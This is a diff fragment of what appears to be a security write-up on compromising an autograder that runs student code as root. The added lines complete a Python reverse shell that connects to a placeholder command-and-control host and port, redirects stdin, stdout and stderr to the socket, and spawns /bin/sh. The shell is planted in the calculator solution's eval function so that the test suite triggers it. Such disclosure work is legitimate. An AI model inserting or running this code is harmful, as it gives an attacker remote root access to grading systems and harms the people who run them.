@@ -68,10 +68,15 @@ Additionally, the student runs as root, so the reverse shell will also inherit r
 Starting from the Python calculator [official solution](https://github.com/gradescope/autograder_samples/blob/master/python/src/solution/calculator.py), all we need to do is add this code to the `eval` function -- a function we can predict will be run by the client code test suite:
 
 ```python
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("C2_HOST_IP", C2_PORT))
+
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
+
 pty.spawn("/bin/sh")
 ```
 
